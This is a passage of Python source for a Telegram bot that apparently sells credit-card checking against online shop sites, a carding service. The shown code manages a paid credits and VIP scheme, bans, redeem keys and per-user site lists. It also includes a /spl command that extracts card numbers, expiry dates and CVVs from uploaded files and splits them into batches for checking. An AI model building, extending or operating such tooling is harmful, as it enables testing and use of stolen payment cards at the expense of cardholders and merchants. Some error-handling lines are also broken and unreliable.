        final_text += "❌ **𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨 (𝙍𝙚𝙢𝙤𝙫𝙚𝙙):**\n"
        for idx, site in enumerate(dead_sites, 1):
            final_text += f"{idx}. `{site}`\n"

    try:
        await event.edit(final_text)
    except:
        pass

@require_membership
@client.on(events.CallbackQuery(pattern=rb"add_working:(\d+):(.+)"))
async def add_working_sites_callback(event):
    try:
        match = event.pattern_match
        callback_user_id = int(match.group(1).decode())
        working_sites_data = match.group(2).decode()
        working_sites = working_sites_data.split("|")

        if event.sender_id != callback_user_id:
            return await event.answer("❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙖𝙙𝙙 𝙨𝙞𝙩𝙚𝙨 𝙛𝙧𝙤𝙢 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙘𝙝𝙚𝙘𝙠!", alert=True)

        sites_data = await load_json(SITE_FILE)
        user_sites = sites_data.get(str(callback_user_id), [])

        added_sites = []
        already_exists = []

        for site in working_sites:
            if site not in user_sites:
                user_sites.append(site)
                added_sites.append(site)
            else:
                already_exists.append(site)

        sites_data[str(callback_user_id)] = user_sites
        await save_json(SITE_FILE, sites_data)

        response_parts = []
        if added_sites:
            added_text = f"✅ **𝘼𝙙𝙙𝙚𝙙 {len(added_sites)} 𝙉𝙚𝙬 𝙎𝙞𝙩𝙚𝙨:**\n"
            for site in added_sites:
                added_text += f"• `{site}`\n"
            response_parts.append(added_text)

        if already_exists:
            exists_text = f"⚠️ **{len(already_exists)} 𝙎𝙞𝙩𝙚𝙨 𝘼𝙡𝙧𝙚𝙖𝙙𝙮 𝙀𝙭𝙞𝙨𝙩:**\n"
            for site in already_exists:
                exists_text += f"• `{site}`\n"
            response_parts.append(exists_text)

        if response_parts:
            response_text = "\n".join(response_parts)
            response_text += f"\n📊 **𝙏𝙤𝙩𝙖𝙡 𝙎𝙞𝙩𝙚𝙨 𝙞𝙣 𝙔𝙤𝙪𝙧 𝘿𝘽:** {len(user_sites)}"
        else:
            response_text = "ℹ️ 𝘼𝙡𝙡 𝙨𝙞𝙩𝙚𝙨 𝙖𝙧𝙚 𝙖𝙡𝙧??𝙖𝙙𝙮 𝙞𝙣 𝙮𝙤𝙪𝙧 𝘿𝘽!"

        await event.answer("✅ 𝙎𝙞𝙩𝙚𝙨 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙!", alert=False)

        current_text = event.message.text
        updated_text = current_text + f"\n\n🔄 **𝙐𝙥𝙙??𝙩𝙚:**\n{response_text}"

        try:
            await event.edit(updated_text)
        except:
            await event.respond(response_text)

    except Exception as e:
        await event.answer(f"❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}", alert=True)

# OLD /unauth command removed - Use /removecredit instead

@client.on(events.NewMessage(pattern=r'^/on\s+'))
async def enable_command(event):
    """Admin command to enable a specific command"""
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!", link_preview=False)
    
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("**Format:** `/on <command>`\n\n**Available commands:**\nst, pp, mpp, sh, msh, mtxt, psh, pmsh, ptxt, gen, bin, check, fl, fake, info, sites", link_preview=False)
        
        cmd = parts[1].lower().replace('/', '').replace('.', '')
        
        if cmd not in COMMAND_STATES:
            return await event.reply(f"❌ **Unknown command:** `{cmd}`\n\n**Available commands:**\nst, pp, mpp, sh, msh, mtxt, psh, pmsh, ptxt, gen, bin, check, fl, fake, info, sites", link_preview=False)
        
        if COMMAND_STATES[cmd]:
            return await event.reply(f"ℹ️ **Command `/{cmd}` is already enabled!**", link_preview=False)
        
        COMMAND_STATES[cmd] = True
        await save_command_states()
        
        await event.reply(f"✅ **Command `/{cmd}` has been enabled successfully!**", link_preview=False)
    
    except Exception as e:
        await event.reply(f"❌ **Error:** {str(e, link_preview=False)}")

@client.on(events.NewMessage(pattern=r'^/off\s+'))
async def disable_command(event):
    """Admin command to disable a specific command"""
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!", link_preview=False)
    
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("**Format:** `/off <command>`\n\n**Available commands:**\nst, pp, mpp, sh, msh, mtxt, psh, pmsh, ptxt, gen, bin, check, fl, fake, info, sites", link_preview=False)
        
        cmd = parts[1].lower().replace('/', '').replace('.', '')
        
        if cmd not in COMMAND_STATES:
            return await event.reply(f"❌ **Unknown command:** `{cmd}`\n\n**Available commands:**\nst, pp, mpp, sh, msh, mtxt, psh, pmsh, ptxt, gen, bin, check, fl, fake, info, sites", link_preview=False)
        
        if not COMMAND_STATES[cmd]:
            return await event.reply(f"ℹ️ **Command `/{cmd}` is already disabled!**", link_preview=False)
        
        COMMAND_STATES[cmd] = False
        await save_command_states()
        
        await event.reply(f"🔴 **Command `/{cmd}` has been disabled successfully!**", link_preview=False)
    
    except Exception as e:
        await event.reply(f"❌ **Error:** {str(e, link_preview=False)}")

@client.on(events.NewMessage(pattern=r'^/cmdstatus$'))
async def command_status(event):
    """Admin command to view all command states"""
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!", link_preview=False)
    
    try:
        status_text = "**📊 Command Status:**\n\n"
        for cmd, enabled in sorted(COMMAND_STATES.items()):
            emoji = "✅" if enabled else "🔴"
            status = "ON" if enabled else "OFF"
            status_text += f"{emoji} `/{cmd}` - **{status}**\n"
        
        status_text += "\n**Usage:**\n`/on <command>` - Enable command\n`/off <command>` - Disable command"
        
        await event.reply(status_text, link_preview=False)
    
    except Exception as e:
        await event.reply(f"❌ **Error:** {str(e, link_preview=False)}")

@client.on(events.NewMessage(pattern=r'^/ban(\s|$)'))
async def ban_user_command(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!", link_preview=False)

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("Format: /ban {user_id}", link_preview=False)

        user_id = int(parts[1])

        if await is_banned_user(user_id):
            return await event.reply(f"❌ 𝙐𝙨𝙚𝙧 {user_id} 𝙞𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙗𝙖𝙣𝙣𝙚𝙙!", link_preview=False)

        await remove_premium_user(user_id)
        await ban_user(user_id, event.sender_id)

        await event.reply(f"✅ 𝙐𝙨𝙚𝙧 {user_id} 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙗𝙖𝙣𝙣𝙚𝙙!", link_preview=False)

        try:
            await client.send_message(user_id, f"🚫 𝙔𝙤𝙪 𝙃𝙖𝙫𝙚 𝘽𝙚𝙚𝙣 𝘽𝙖𝙣𝙣𝙚𝙙!\n\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤 𝙡𝙤𝙣𝙜𝙚𝙧 𝙖𝙗𝙡𝙚 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙤𝙧 𝙜𝙧𝙤𝙪𝙥 𝙘𝙝𝙖𝙩.\n\n𝙁𝙤𝙧 𝙖𝙥𝙥𝙚𝙖𝙡, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 [𝘼𝙆](https://t.me/Akbhai007)")
        except:
            pass

    except ValueError:
        await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿!", link_preview=False)
    except Exception as e:
        await event.reply(f"❌ Error: {e}", link_preview=False)

@client.on(events.NewMessage(pattern=r'^/unban(\s|$)'))
async def unban_user_command(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!", link_preview=False)

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("Format: /unban {user_id}", link_preview=False)

        user_id = int(parts[1])

        if not await is_banned_user(user_id):
            return await event.reply(f"❌ 𝙐𝙨𝙚𝙧 {user_id} 𝙞𝙨 𝙣𝙤𝙩 𝙗𝙖𝙣𝙣𝙚𝙙!", link_preview=False)

        success = await unban_user(user_id)

        if success:
            await event.reply(f"✅ 𝙐𝙨𝙚𝙧 {user_id} 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙪𝙣𝙗𝙖𝙣𝙣𝙚𝙙!", link_preview=False)

            try:
                await client.send_message(user_id, f"🎉 𝙔𝙤𝙪 𝙃𝙖𝙫𝙚 𝘽𝙚𝙚𝙣 𝙐𝙣𝙗𝙖𝙣𝙣𝙚𝙙!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤𝙬 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙖𝙜𝙖𝙞𝙣 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥𝙨.\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙮𝙤𝙪 𝙬𝙞𝙡𝙡 𝙣𝙚𝙚𝙙 𝙩𝙤 𝙥𝙪𝙧𝙘𝙝𝙖𝙨𝙚 𝙖 𝙣𝙚𝙬 𝙠𝙚𝙮.", link_preview=False)
            except:
                pass
        else:
            await event.reply(f"❌ 𝙁𝙖𝙞𝙡𝙚𝙙 𝙩𝙤 𝙪𝙣𝙗𝙖𝙣 𝙪𝙨𝙚𝙧 {user_id}", link_preview=False)

    except ValueError:
        await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿!", link_preview=False)
    except Exception as e:
        await event.reply(f"❌ Error: {e}", link_preview=False)

# ===== CREDIT SYSTEM ADMIN COMMANDS =====

@client.on(events.NewMessage(pattern=r'^/addcredit'))
async def addcredit_command(event):
    """Add credits to user - Format: /addcredit amount (reply to user) or /addcredit user_id/username amount"""
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 Only Admin Can Use This Command!", link_preview=False)
    
    try:
        parts = event.raw_text.split()
        
        # Check if replying to a message
        if event.reply_to_msg_id:
            if len(parts) != 2:
                return await event.reply("**Format:** `/addcredit amount` (reply to user's message)\n\n**Example:**\nReply to user and type: `/addcredit 500`", link_preview=False)
            
            amount = int(parts[1])
            
            if amount <= 0:
                return await event.reply("❌ Amount must be greater than 0!", link_preview=False)
            
            # Get user from replied message
            replied_msg = await event.get_reply_message()
            user_id = replied_msg.sender_id
        else:
            # Original format: /addcredit user_id/username amount
            if len(parts) != 3:
                return await event.reply("**Format:** `/addcredit user_id/username amount`\n\n**Example:**\n`/addcredit 123456789 500`\n`/addcredit @username 500`\n\nOr reply to user's message: `/addcredit 500`", link_preview=False)
            
            user_identifier = parts[1]
            amount = int(parts[2])
            
            if amount <= 0:
                return await event.reply("❌ Amount must be greater than 0!", link_preview=False)
            
            # Check if it's username or user_id
            if user_identifier.startswith('@'):
                username = user_identifier[1:]
                try:
                    user_entity = await client.get_entity(username)
                    user_id = user_entity.id
                except:
                    return await event.reply(f"❌ User @{username} not found!", link_preview=False)
            else:
                user_id = int(user_identifier)
        
        # Add credits
        user_data = await add_user_credits(user_id, amount)
        
        await event.reply(
            f"✅ **Credits Added Successfully!**\n\n"
            f"👤 User ID: `{user_id}`\n"
            f"💰 Credits Added: `{amount}`\n"
            f"💵 New Balance: `{user_data['credits']}`\n"
            f"📊 Plan: `{user_data['plan']}`"
        , link_preview=False)
        
        # Notify user
        try:
            await client.send_message(
                user_id,
                f"🎉 **Credits Added!**\n\n"
                f"💰 Amount: `{amount}` credits\n"
                f"💵 New Balance: `{user_data['credits']}` credits\n"
                f"📊 Plan: `{user_data['plan']}`\n\n"
                f"✨ You can now use CC check commands!"
            , link_preview=False)
        except:
            pass
    
    except ValueError:
        await event.reply("❌ Invalid user ID or amount!", link_preview=False)
    except Exception as e:
        await event.reply(f"❌ Error: {e}", link_preview=False)

@client.on(events.NewMessage(pattern=r'^/removecredit'))
async def removecredit_command(event):
    """Remove all credits from user - Format: /removecredit (reply to user) or /removecredit user_id/username"""
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 Only Admin Can Use This Command!", link_preview=False)
    
    try:
        parts = event.raw_text.split()
        
        # Check if replying to a message
        if event.reply_to_msg_id:
            # Get user from replied message
            replied_msg = await event.get_reply_message()
            user_id = replied_msg.sender_id
        else:
            # Original format: /removecredit user_id/username
            if len(parts) != 2:
                return await event.reply("**Format:** `/removecredit user_id/username`\n\n**Example:**\n`/removecredit 123456789`\n`/removecredit @username`\n\nOr reply to user's message: `/removecredit`", link_preview=False)
            
            user_identifier = parts[1]
            
            # Check if it's username or user_id
            if user_identifier.startswith('@'):
                username = user_identifier[1:]
                try:
                    user_entity = await client.get_entity(username)
                    user_id = user_entity.id
                except:
                    return await event.reply(f"❌ User @{username} not found!", link_preview=False)
            else:
                user_id = int(user_identifier)
        
        # Get current credits before removing
        user_data = await get_user_credits(user_id)
        old_credits = user_data.get('credits', 0)
        
        # Remove all credits
        success = await remove_all_credits(user_id)
        
        if success or old_credits > 0:
            await event.reply(
                f"✅ **All Credits Removed!**\n\n"
                f"👤 User ID: `{user_id}`\n"
                f"💰 Removed: `{old_credits}` credits\n"
                f"💵 New Balance: `0` credits\n"
                f"📊 Plan: `Free`"
            , link_preview=False)
            
            # Notify user
            try:
                await client.send_message(
                    user_id,
                    f"⚠️ **Credits Removed!**\n\n"
                    f"💰 Your credits have been reset to 0.\n"
                    f"📊 Plan: Free\n\n"
                    f"💡 Contact [𝘼𝙆](https://t.me/Akbhai007) for more information."
                , link_preview=False)
            except:
                pass
        else:
            await event.reply(f"❌ User {user_id} has no credits to remove!", link_preview=False)
    
    except ValueError:
        await event.reply("❌ Invalid user ID!", link_preview=False)
    except Exception as e:
        await event.reply(f"❌ Error: {e}", link_preview=False)

@client.on(events.NewMessage(pattern=r'^/removeplan'))
async def removeplan_command(event):
    """Remove plan and set to Free - Format: /removeplan (reply to user) or /removeplan user_id/username"""
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 Only Admin Can Use This Command!", link_preview=False)
    
    try:
        parts = event.raw_text.split()
        
        # Check if replying to a message
        if event.reply_to_msg_id:
            # Get user from replied message
            replied_msg = await event.get_reply_message()
            user_id = replied_msg.sender_id
        else:
            # Original format: /removeplan user_id/username
            if len(parts) != 2:
                return await event.reply("**Format:** `/removeplan user_id/username`\n\n**Example:**\n`/removeplan 123456789`\n`/removeplan @username`\n\nOr reply to user's message: `/removeplan`", link_preview=False)
            
            user_identifier = parts[1]
            
            # Check if it's username or user_id
            if user_identifier.startswith('@'):
                username = user_identifier[1:]
                try:
                    user_entity = await client.get_entity(username)
                    user_id = user_entity.id
                except:
                    return await event.reply(f"❌ User @{username} not found!", link_preview=False)
            else:
                user_id = int(user_identifier)
        
        # Get current user data
        user_data = await get_user_credits(user_id)
        old_plan = user_data.get('plan', 'Free')
        old_credits = user_data.get('credits', 0)
        
        # Set to Free plan with 0 credits
        await set_user_credits(user_id, 0, "Free")
        
        await event.reply(
            f"✅ **Plan Removed!**\n\n"
            f"👤 User ID: `{user_id}`\n"
            f"📊 Old Plan: `{old_plan}`\n"
            f"💰 Old Credits: `{old_credits}`\n"
            f"📊 New Plan: `Free` 🆓\n"
            f"💵 New Balance: `0` credits"
        , link_preview=False)
        
        # Notify user
        try:
            await client.send_message(
                user_id,
                f"⚠️ **Plan Removed!**\n\n"
                f"Your plan has been reset to Free.\n"
                f"📊 Plan: Free 🆓\n"
                f"💰 Credits: 0\n\n"
                f"💡 Contact [𝘼𝙆](https://t.me/Akbhai007) for more information.",
                link_preview=False
            )
        except:
            pass
    
    except ValueError:
        await event.reply("❌ Invalid user ID!", link_preview=False)
    except Exception as e:
        await event.reply(f"❌ Error: {e}", link_preview=False)

@client.on(events.NewMessage(pattern=r'^/auth'))
async def auth_group_command(event):
    """Authorize a group to use the bot - Format: /auth group_id days"""
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 Only Admin Can Use This Command!", link_preview=False)
    
    try:
        parts = event.raw_text.split()
        if len(parts) != 3:
            return await event.reply(
                "**Format:** `/auth group_id days`\n\n"
                "**Example:**\n"
                "`/auth -1001234567890 30`\n"
                "`/auth -1001234567890 90`\n\n"
                "**Tip:** Forward a message from the group to get its ID"
            , link_preview=False)
        
        group_id = int(parts[1])
        days = int(parts[2])
        
        # Validate group_id format (should be negative for groups)
        if group_id >= 0:
            return await event.reply("❌ Invalid group ID! Group IDs are negative numbers.", link_preview=False)
        
        # Add group to authorized list
        await add_premium_group(group_id, days)
        
        expiry_date = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=days)
        expiry_text = expiry_date.strftime("%d %b %Y")
        
        await event.reply(
            f"✅ **Group Authorized!**\n\n"
            f"🆔 Group ID: `{group_id}`\n"
            f"⏰ Duration: {days} days\n"
            f"📅 Expires: {expiry_text}\n\n"
            f"The group can now use all bot commands!"
        , link_preview=False)
    
    except ValueError:
        await event.reply("❌ Invalid format! Use: `/auth group_id [days]`", link_preview=False)
    except Exception as e:
        await event.reply(f"❌ Error: {e}", link_preview=False)

@client.on(events.NewMessage(pattern=r'^/unauth'))
async def unauth_group_command(event):
    """Remove authorization from a group - Format: /unauth group_id"""
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 Only Admin Can Use This Command!", link_preview=False)
    
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply(
                "**Format:** `/unauth group_id`\n\n"
                "**Example:**\n"
                "`/unauth -1001234567890`\n\n"
                "**Tip:** Forward a message from the group to get its ID"
            , link_preview=False)
        
        group_id = int(parts[1])
        
        # Validate group_id format
        if group_id >= 0:
            return await event.reply("❌ Invalid group ID! Group IDs are negative numbers.", link_preview=False)
        
        # Remove group from authorized list
        removed = await remove_premium_group(group_id)
        
        if removed:
            await event.reply(
                f"✅ **Group Unauthorized!**\n\n"
                f"🆔 Group ID: `{group_id}`\n\n"
                f"The group can no longer use bot commands."
            , link_preview=False)
        else:
            await event.reply(f"❌ Group `{group_id}` was not in the authorized list!", link_preview=False)
    
    except ValueError:
        await event.reply("❌ Invalid group ID!", link_preview=False)
    except Exception as e:
        await event.reply(f"❌ Error: {e}", link_preview=False)

# /premium command removed - only Free and VIP plans available

@client.on(events.NewMessage(pattern=r'^/vip'))
async def vip_command(event):
    """Set VIP plan - Format: /vip user_id/username days"""
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 Only Admin Can Use This Command!", link_preview=False)
    
    try:
        parts = event.raw_text.split()
        if len(parts) < 2 or len(parts) > 3:
            return await event.reply(
                "**Format:** `/vip user_id/username [days]`\n\n"
                "**Examples:**\n"
                "`/vip 123456789` (default 15 days)\n"
                "`/vip @username 30` (30 days)\n"
                "`/vip 123456789 7` (7 days)",
                link_preview=False
            )
        
        user_identifier = parts[1]
        days = 15  # Default 15 days
        
        # Get days if provided
        if len(parts) == 3:
            try:
                days = int(parts[2])
                if days <= 0:
                    return await event.reply("❌ Days must be greater than 0!", link_preview=False)
            except ValueError:
                return await event.reply("❌ Invalid days! Must be a number.", link_preview=False)
        
        # Check if it's username or user_id
        if user_identifier.startswith('@'):
            username = user_identifier[1:]
            try:
                user_entity = await client.get_entity(username)
                user_id = user_entity.id
            except:
                return await event.reply(f"❌ User @{username} not found!", link_preview=False)
        else:
            user_id = int(user_identifier)
        
        # Set VIP plan without changing credits, with expiry
        user_data = await set_user_plan(user_id, "VIP", days)
        
        await event.reply(
            f"✅ **VIP Plan Activated!**\n\n"
            f"👤 User ID: `{user_id}`\n"
            f"💎 Plan: `VIP`\n"
            f"📅 Duration: `{days} days`\n"
            f"✨ Features: Unlimited checks, NO credit required"
        , link_preview=False)
        
        # Notify user
        try:
            # Get current date/time
            from datetime import datetime, timedelta
            activated_on = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            expires_on = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
            
            await client.send_message(
                user_id,
                f"```\n🎉 VIP 💎 Plan Activated!\n```"
                f"• **Plan:** VIP 💎\n"
                f"• **Activated On:** {activated_on}\n"
                f"• **Expires On:** {expires_on}\n"
                f"• **Unlimited /ptxt checks**\n"
                f"• **NO Credit Required**\n\n"
                f"🎉 **Thank you for choosing our Pro VIP!** 💎\n\n"
                f"You can check your plan using /myplan"
            , link_preview=False)
        except:
            pass
    
    except ValueError:
        await event.reply("❌ Invalid user ID!", link_preview=False)
    except Exception as e:
        await event.reply(f"❌ Error: {e}", link_preview=False)

@client.on(events.NewMessage(pattern=r'^/delplan'))
async def delplan_command(event):
    """Revoke user plan and set to Free - Format: /delplan user_id/username"""
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 Only Admin Can Use This Command!", link_preview=False)
    
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("**Format:** `/delplan user_id/username`\n\n**Example:**\n`/delplan 123456789`\n`/delplan @username`", link_preview=False)
        
        user_identifier = parts[1]
        
        # Check if it's username or user_id
        if user_identifier.startswith('@'):
            username = user_identifier[1:]
            try:
                user_entity = await client.get_entity(username)
                user_id = user_entity.id
            except:
                return await event.reply(f"❌ User @{username} not found!", link_preview=False)
        else:
            user_id = int(user_identifier)
        
        # Get current user data
        user_data = await get_user_credits(user_id)
        old_plan = user_data.get('plan', 'Free')
        old_credits = user_data.get('credits', 0)
        
        # Set plan to Free and reset credits to 100
        user_data = await set_user_credits(user_id, 100, "Free")
        
        await event.reply(
            f"✅ **Plan Revoked!**\n\n"
            f"👤 User ID: `{user_id}`\n"
            f"📊 Old Plan: `{old_plan}`\n"
            f"📊 New Plan: `Free`\n"
            f"💰 Old Credits: `{old_credits}`\n"
            f"💰 New Credits: `100`\n"
            f"⚠️ User can no longer access /mtxt and /ptxt"
        , link_preview=False)
        
        # Notify user
        try:
            await client.send_message(
                user_id,
                f"⚠️ **Plan Revoked!**\n\n"
                f"📊 Your plan has been changed to Free.\n"
                f"💰 Credits reset to: `100`\n\n"
                f"❌ You can no longer access:\n"
                f"  • /mtxt command\n"
                f"  • /ptxt command\n\n"
                f"✅ You can still use:\n"
                f"  • /sh, /lol, /msh commands\n"
                f"  • /psh, /pmsh commands\n\n"
                f"💡 Contact [𝘼𝙆](https://t.me/Akbhai007) for more information."
            , link_preview=False)
        except:
            pass
    
    except ValueError:
        await event.reply("❌ Invalid user ID!", link_preview=False)
    except Exception as e:
        await event.reply(f"❌ Error: {e}", link_preview=False)

@client.on(events.NewMessage(pattern=r'^/spl\s+(\d+)$'))
async def split_cc_command(event):
    """Split CCs from txt file into multiple files - Reply to txt file with /spl 200"""
    try:
        # Get split size
        split_size = int(event.pattern_match.group(1))
        
        if split_size < 50:
            return await event.reply("❌ Minimum split size is 50 CCs per file!", link_preview=False)
        
        # Check if replying to a message with document
        if not event.reply_to_msg_id:
            return await event.reply(
                "**📂 File Splitter**\n\n"
                "**Usage:** Reply to a .txt file with `/spl <number>`\n\n"
                "**Example:**\n"
                "Reply to CC file and type: `/spl 500`\n\n"
                "**Features:**\n"
                "• Splits large CC files into smaller parts\n"
                "• Filters and formats cards automatically\n"
                "• Max file size: 10 MB\n"
                "• Min split size: 50 CCs per file\n\n"
                "**Note:** Each part will contain the specified number of CCs",
                link_preview=False
            )
        
        replied_msg = await event.get_reply_message()
        
        if not replied_msg.document:
            return await event.reply("❌ Please reply to a .txt file!", link_preview=False)
        
        # Check if it's a text file
        file_name = replied_msg.document.attributes[0].file_name if replied_msg.document.attributes else "file.txt"
        if not file_name.endswith('.txt'):
            return await event.reply("❌ Only .txt files are supported!", link_preview=False)
        
        # Check file size (10MB limit)
        file_size = replied_msg.document.size
        max_size = 10 * 1024 * 1024  # 10MB in bytes
        
        if file_size > max_size:
            size_mb = file_size / (1024 * 1024)
            return await event.reply(
                f"❌ **File Too Large!**\n\n"
                f"📁 Your file: `{size_mb:.2f} MB`\n"
                f"📏 Maximum allowed: `10 MB`\n\n"
                f"💡 **Solution:**\n"
                f"• Split your file into smaller parts (< 10MB)\n"
                f"• Then use /spl 500",
                link_preview=False
            )
        
        status_msg = await event.reply(f"⏳ Downloading and filtering CCs...", link_preview=False)
        
        # Download the file
        file_path = await replied_msg.download_media()
        
        # Read and filter CCs using same logic as /fl command
        import re
        card_pattern = r'\b(\d{13,19}(?:\s*\|\s*\d{1,2}\s*\|\s*\d{2,4}\s*\|\s*\d{3,4})?)\b'
        
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            text_content = f.read()
        
        matches = re.findall(card_pattern, text_content)
        
        if not matches:
            os.remove(file_path)
            return await status_msg.edit("❌ No valid cards found in the file!", link_preview=False)
        
        # Clean and format cards (same as /fl)
        filtered_cards = []
        for match in matches:
            card = match.strip()
            if '|' in card:
                parts = card.split('|')
                if len(parts) == 4:
                    cc = parts[0].strip()
                    mm = parts[1].strip().zfill(2)
                    yy = parts[2].strip()
                    if len(yy) == 2:
                        yy = yy.zfill(2)
                    cvv = parts[3].strip().zfill(3)
                    card = f"{cc}|{mm}|{yy}|{cvv}"
                else:
                    card = '|'.join([p.strip() for p in parts])
            else:
                card = card.replace(' ', '')
            
            if card not in filtered_cards:
                filtered_cards.append(card)
        
        if not filtered_cards:
            os.remove(file_path)
            return await status_msg.edit("❌ No valid cards found!", link_preview=False)
        
        # Split into chunks
        total_files = (len(filtered_cards) + split_size - 1) // split_size
        
        await status_msg.edit(f"📦 Creating {total_files} files with {split_size} CCs each...", link_preview=False)
        
        created_files = []
        
        for i in range(0, len(filtered_cards), split_size):
            chunk = filtered_cards[i:i + split_size]
            chunk_file_name = f"[@shopifyfucker_bot]split_{len(created_files) + 1}.txt"
            
            with open(chunk_file_name, 'w') as f:
                f.write('\n'.join(chunk))
            
            created_files.append(chunk_file_name)
        
        # Send all split files
        await status_msg.edit(f"📤 Sending {len(created_files)} files...", link_preview=False)
        
        for idx, split_file in enumerate(created_files, 1):
            try:
                cc_count = len(filtered_cards[split_size * (idx - 1):split_size * idx])
                await client.send_file(
                    event.chat_id,
                    split_file,
                    caption=f"📄 **Part {idx}/{len(created_files)}**\n💳 CCs: `{cc_count}`",
                    reply_to=event.id
                )
            except Exception as e:
                print(f"[SPL] Error sending file {split_file}: {e}")
            finally:
                # Always try to remove file
                try:
                    if os.path.exists(split_file):
                        os.remove(split_file)
                except Exception as e:
                    print(f"[SPL] Error removing file {split_file}: {e}")
        
        # Cleanup original file
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
        except Exception as e:
            print(f"[SPL] Error removing original file: {e}")
        await status_msg.edit(
            f"✅ **Split Complete!**\n\n"
            f"📝 Total CCs: `{len(filtered_cards)}`\n"
            f"📦 Files Created: `{len(created_files)}`\n"
            f"💳 CCs per file: `{split_size}`",
            link_preview=False
        )
    
    except Exception as e:
        await event.reply(f"❌ Error: {e}", link_preview=False)

@client.on(events.NewMessage(pattern=r'^/showkey$'))
async def showkey_command(event):
    """Show all unused redeem keys"""
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 Only Admin Can Use This Command!", link_preview=False)
    
    try:
        redeem_keys_data = await load_json(REDEEM_KEYS_FILE)
        
        # Filter unused keys
        unused_keys = [(k, v) for k, v in redeem_keys_data.items() if not v.get('redeemed', False)]
        
        if not unused_keys:
            return await event.reply("❌ No unused keys available!", link_preview=False)
        
        # Format keys message
        keys_text = ""
        total_credits = 0
        
        for key, key_data in unused_keys:
            credits = key_data.get('credits', 0)
            created = key_data.get('created_at', 'N/A')
            total_credits += credits
            
            # Format date
            date_str = "N/A"
            if created != 'N/A':
                try:
                    date_obj = datetime.datetime.fromisoformat(created)
                    date_str = date_obj.strftime("%d %b %Y, %I:%M %p")
                except:
                    date_str = created
            
            keys_text += f"🔑 `{key}`\n"
            keys_text += f"   💰 Credits: {credits}\n"
            keys_text += f"   📅 Created: {date_str}\n\n"
        
        await event.reply(
            f"⏳ **Unused Redeem Keys**\n\n"
            f"🔢 Total Keys: `{len(unused_keys)}`\n"
            f"💰 Total Credits: `{total_credits}`\n\n"
            f"{keys_text}"
            f"💡 Users can redeem using: /redeem KEY"
        , link_preview=False)
    
    except Exception as e:
        await event.reply(f"❌ Error: {e}", link_preview=False)

@client.on(events.NewMessage(pattern=r'^/key'))
async def key_command(event):
    """Generate redeem keys - Format: /key key_amount credit_amount"""
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 Only Admin Can Use This Command!", link_preview=False)
    
    try:
        parts = event.raw_text.split()
        if len(parts) != 3:
            return await event.reply("**Format:** `/key key_amount credit_amount`\n\n**Example:**\n`/key 5 500` - Generate 5 keys with 500 credits each", link_preview=False)
        
        key_count = int(parts[1])
